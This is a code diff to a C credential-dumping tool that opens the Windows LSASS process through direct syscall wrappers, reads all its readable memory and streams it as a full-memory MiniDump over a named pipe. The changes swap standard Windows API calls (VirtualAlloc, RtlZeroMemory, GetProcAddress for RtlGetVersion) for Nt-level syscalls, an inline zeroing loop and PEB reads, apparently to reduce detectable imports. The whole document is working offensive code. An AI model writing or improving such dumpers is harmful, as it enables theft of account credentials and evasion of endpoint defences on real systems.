@@ -1,12 +1,7 @@
 /**
  * LSASS memory dump — reads process memory via NtReadVirtualMemory,
  * streams as MiniDump format through the named pipe.
- *
- * Builds a valid MDMP file with:
- * - Header
- * - SystemInfo stream (with proper CSDVersion string)
- * - ModuleList stream (from PEB)
- * - Memory64List stream (all readable regions)
+ * All allocations via NtAllocateVirtualMemory, OS version from PEB.
  */
 
 #include <windows.h>
@@ -61,8 +56,6 @@ typedef struct _MDMP_MEMORY64_LIST_HEADER {
 
 #pragma pack(pop)
 
-/* CSDVersion string: MINIDUMP_STRING = { ULONG32 Length; WCHAR Buffer[] } */
-/* Empty string: Length=0, Buffer=L'\0' → 4 + 2 = 6 bytes, padded to 8 */
 #define CSDVERSION_SIZE 8
 
 typedef struct _MODULE_INFO {
@@ -75,9 +68,16 @@ typedef struct _MODULE_INFO {
 
 #define MAX_MODULES 256
 
+/* inline memset replacement */
+static inline void zero_mem(void *dst, SIZE_T len) {
+    BYTE *p = (BYTE *)dst;
+    while (len--) *p++ = 0;
+}
+
 static DWORD enumerate_modules(HANDLE process, MODULE_INFO *modules, DWORD max_modules) {
     DWORD count = 0;
-    PROCESS_BASIC_INFORMATION pbi = {0};
+    PROCESS_BASIC_INFORMATION pbi;
+    zero_mem(&pbi, sizeof(pbi));
     SIZE_T ret_len;
 
     NTSTATUS status = sys_NtQueryInformationProcess(
@@ -85,11 +85,13 @@ static DWORD enumerate_modules(HANDLE process, MODULE_INFO *modules, DWORD max_m
     );
     if (status != 0 || !pbi.PebBaseAddress) return 0;
 
-    PEB peb = {0};
+    PEB peb;
+    zero_mem(&peb, sizeof(peb));
     status = sys_NtReadVirtualMemory(process, pbi.PebBaseAddress, &peb, sizeof(peb), &ret_len);
     if (status != 0 || !peb.Ldr) return 0;
 
-    PEB_LDR_DATA ldr = {0};
+    PEB_LDR_DATA ldr;
+    zero_mem(&ldr, sizeof(ldr));
     status = sys_NtReadVirtualMemory(process, peb.Ldr, &ldr, sizeof(ldr), &ret_len);
     if (status != 0) return 0;
 
@@ -97,7 +99,8 @@ static DWORD enumerate_modules(HANDLE process, MODULE_INFO *modules, DWORD max_m
     PVOID current_link = ldr.InMemoryOrderModuleList.Flink;
 
     while (current_link != list_head && count < max_modules) {
-        BYTE entry_buf[sizeof(LDR_DATA_TABLE_ENTRY)] = {0};
+        BYTE entry_buf[sizeof(LDR_DATA_TABLE_ENTRY)];
+        zero_mem(entry_buf, sizeof(entry_buf));
         PVOID entry_addr = (BYTE*)current_link - 0x10;
 
         status = sys_NtReadVirtualMemory(process, entry_addr, entry_buf, sizeof(LDR_DATA_TABLE_ENTRY), &ret_len);
@@ -168,10 +171,33 @@ static DWORD enumerate_regions(HANDLE process, REGION_INFO *regions, DWORD max_r
     return count;
 }
 
+/* ── Helper: allocate memory via NtAllocateVirtualMemory ─── */
+
+static PVOID alloc_mem(SIZE_T size) {
+    PVOID base = NULL;
+    SIZE_T region = size;
+    NTSTATUS status = sys_NtAllocateVirtualMemory(
+        (HANDLE)-1, &base, 0, &region,
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
+    );
+    return NT_SUCCESS(status) ? base : NULL;
+}
+
+static void free_mem(PVOID ptr) {
+    if (!ptr) return;
+    SIZE_T size = 0;
+    sys_NtFreeVirtualMemory((HANDLE)-1, &ptr, &size, MEM_RELEASE);
+}
+
+/* ── Main dump function ──────────────────────────────────── */
+
 BOOL dump_lsass(DWORD pid, HANDLE pipe) {
     HANDLE process = NULL;
-    OBJECT_ATTRIBUTES oa = {sizeof(oa), 0};
-    CLIENT_ID cid = {0};
+    OBJECT_ATTRIBUTES oa;
+    zero_mem(&oa, sizeof(oa));
+    oa.Length = sizeof(oa);
+    CLIENT_ID cid;
+    zero_mem(&cid, sizeof(cid));
     cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
 
     NTSTATUS status = sys_NtOpenProcess(
@@ -185,9 +211,7 @@ BOOL dump_lsass(DWORD pid, HANDLE pipe) {
         return FALSE;
 
     /* Enumerate memory regions */
-    REGION_INFO *regions = (REGION_INFO *)VirtualAlloc(
-        NULL, sizeof(REGION_INFO) * MAX_REGIONS, MEM_COMMIT, PAGE_READWRITE
-    );
+    REGION_INFO *regions = (REGION_INFO *)alloc_mem(sizeof(REGION_INFO) * MAX_REGIONS);
     if (!regions) {
         sys_NtClose(process);
         return FALSE;
@@ -195,15 +219,13 @@ BOOL dump_lsass(DWORD pid, HANDLE pipe) {
 
     DWORD region_count = enumerate_regions(process, regions, MAX_REGIONS);
     if (region_count == 0) {
-        VirtualFree(regions, 0, MEM_RELEASE);
+        free_mem(regions);
         sys_NtClose(process);
         return FALSE;
     }
 
     /* Enumerate modules from PEB */
-    MODULE_INFO *modules = (MODULE_INFO *)VirtualAlloc(
-        NULL, sizeof(MODULE_INFO) * MAX_MODULES, MEM_COMMIT, PAGE_READWRITE
-    );
+    MODULE_INFO *modules = (MODULE_INFO *)alloc_mem(sizeof(MODULE_INFO) * MAX_MODULES);
     DWORD module_count = 0;
     if (modules)
         module_count = enumerate_modules(process, modules, MAX_MODULES);
@@ -214,10 +236,8 @@ BOOL dump_lsass(DWORD pid, HANDLE pipe) {
     DWORD dir_size = sizeof(MDMP_DIRECTORY) * num_streams;
     DWORD sysinfo_size = sizeof(MDMP_SYSTEM_INFO);
 
-    /* CSDVersion string placed right after SystemInfo */
     DWORD csdver_rva = header_size + dir_size + sysinfo_size;
 
-    /* Module list layout */
     DWORD module_list_size = 0;
     DWORD module_names_size = 0;
     if (module_count > 0) {
@@ -239,20 +259,22 @@ BOOL dump_lsass(DWORD pid, HANDLE pipe) {
     DWORD data_rva = mem64_rva + mem64_header_size;
 
     /* Header */
-    MDMP_HEADER hdr = {0};
+    MDMP_HEADER hdr;
+    zero_mem(&hdr, sizeof(hdr));
     hdr.Signature = MDMP_SIGNATURE;
     hdr.Version = MDMP_VERSION;
     hdr.ImplementationVersion = 0;
     hdr.NumberOfStreams = num_streams;
     hdr.StreamDirectoryRva = header_size;
     hdr.CheckSum = 0;
-    hdr.TimeDateStamp = (DWORD)__rdtsc();
+    hdr.TimeDateStamp = get_tick();
     hdr.Flags = 0x00000002;  /* MiniDumpWithFullMemory */
 
     write_pipe(pipe, &hdr, sizeof(hdr));
 
     /* Stream directory */
     MDMP_DIRECTORY dirs[3];
+    zero_mem(dirs, sizeof(dirs));
     DWORD di = 0;
     dirs[di].StreamType = STREAM_SYSTEM_INFO;
     dirs[di].DataSize = sysinfo_size;
@@ -270,36 +292,23 @@ BOOL dump_lsass(DWORD pid, HANDLE pipe) {
 
     write_pipe(pipe, dirs, sizeof(MDMP_DIRECTORY) * num_streams);
 
-    /* SystemInfo stream */
-    MDMP_SYSTEM_INFO sysinfo = {0};
+    /* SystemInfo stream — version from PEB */
+    MDMP_SYSTEM_INFO sysinfo;
+    zero_mem(&sysinfo, sizeof(sysinfo));
     sysinfo.ProcessorArchitecture = 9;  /* AMD64 */
     sysinfo.NumberOfProcessors = 1;
-    sysinfo.ProductType = 1;  /* VER_NT_WORKSTATION */
-    sysinfo.MajorVersion = 10;
-    sysinfo.MinorVersion = 0;
-    sysinfo.BuildNumber = 0;
+    sysinfo.ProductType = 1;
+    sysinfo.MajorVersion = get_os_major();
+    sysinfo.MinorVersion = get_os_minor();
+    sysinfo.BuildNumber = get_os_build();
     sysinfo.PlatformId = 2;  /* VER_PLATFORM_WIN32_NT */
     sysinfo.CSDVersionRva = csdver_rva;
 
-    /* Get actual version info */
-    typedef NTSTATUS (WINAPI *RtlGetVersion_t)(POSVERSIONINFOW);
-    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
-    if (ntdll) {
-        RtlGetVersion_t pRtlGetVersion = (RtlGetVersion_t)GetProcAddress(ntdll, "RtlGetVersion");
-        if (pRtlGetVersion) {
-            OSVERSIONINFOW vi = {sizeof(vi)};
-            pRtlGetVersion(&vi);
-            sysinfo.MajorVersion = vi.dwMajorVersion;
-            sysinfo.MinorVersion = vi.dwMinorVersion;
-            sysinfo.BuildNumber = vi.dwBuildNumber;
-        }
-    }
-
     write_pipe(pipe, &sysinfo, sizeof(sysinfo));
 
-    /* CSDVersion string: MINIDUMP_STRING with empty content */
-    BYTE csdver[CSDVERSION_SIZE] = {0};
-    /* Length = 0 (4 bytes), followed by null terminator L'\0' (2 bytes), padded */
+    /* CSDVersion string: empty MINIDUMP_STRING */
+    BYTE csdver[CSDVERSION_SIZE];
+    zero_mem(csdver, CSDVERSION_SIZE);
     write_pipe(pipe, csdver, CSDVERSION_SIZE);
 
     /* ModuleList stream */
@@ -309,7 +318,8 @@ BOOL dump_lsass(DWORD pid, HANDLE pipe) {
         DWORD name_rva_cursor = modnames_rva;
 
         for (DWORD i = 0; i < module_count; i++) {
-            BYTE mod_entry[108] = {0};
+            BYTE mod_entry[108];
+            zero_mem(mod_entry, 108);
             *(ULONG64 *)&mod_entry[0] = (ULONG64)(ULONG_PTR)modules[i].base;
             *(DWORD *)&mod_entry[8] = modules[i].size;
             *(DWORD *)&mod_entry[12] = 0;
@@ -327,7 +337,8 @@ BOOL dump_lsass(DWORD pid, HANDLE pipe) {
             DWORD byte_count = modules[i].name_len;
             write_pipe(pipe, &byte_count, 4);
             write_pipe(pipe, modules[i].name, byte_count);
-            BYTE pad[6] = {0};
+            BYTE pad[6];
+            zero_mem(pad, 6);
             DWORD pad_len = 2;
             if ((byte_count + 2) % 4 != 0)
                 pad_len += 4 - ((byte_count + 2) % 4);
@@ -336,7 +347,8 @@ BOOL dump_lsass(DWORD pid, HANDLE pipe) {
     }
 
     /* Memory64List header */
-    MDMP_MEMORY64_LIST_HEADER mem64hdr = {0};
+    MDMP_MEMORY64_LIST_HEADER mem64hdr;
+    zero_mem(&mem64hdr, sizeof(mem64hdr));
     mem64hdr.NumberOfMemoryRanges = region_count;
     mem64hdr.BaseRva = data_rva;
     write_pipe(pipe, &mem64hdr, sizeof(mem64hdr));
@@ -350,7 +362,7 @@ BOOL dump_lsass(DWORD pid, HANDLE pipe) {
     }
 
     /* Memory data — stream each region */
-    BYTE *buf = (BYTE *)VirtualAlloc(NULL, 65536, MEM_COMMIT, PAGE_READWRITE);
+    BYTE *buf = (BYTE *)alloc_mem(65536);
 
     for (DWORD i = 0; i < region_count; i++) {
         SIZE_T remaining = regions[i].size;
@@ -362,7 +374,7 @@ BOOL dump_lsass(DWORD pid, HANDLE pipe) {
 
             status = sys_NtReadVirtualMemory(process, addr, buf, to_read, &bytes_read);
             if (status != 0 || bytes_read == 0) {
-                RtlZeroMemory(buf, (SIZE_T)to_read);
+                zero_mem(buf, (SIZE_T)to_read);
                 bytes_read = to_read;
             }
 
@@ -372,9 +384,9 @@ BOOL dump_lsass(DWORD pid, HANDLE pipe) {
         }
     }
 
-    VirtualFree(buf, 0, MEM_RELEASE);
-    VirtualFree(regions, 0, MEM_RELEASE);
-    if (modules) VirtualFree(modules, 0, MEM_RELEASE);
+    free_mem(buf);
+    free_mem(regions);
+    free_mem(modules);
     sys_NtClose(process);
 
     return TRUE;
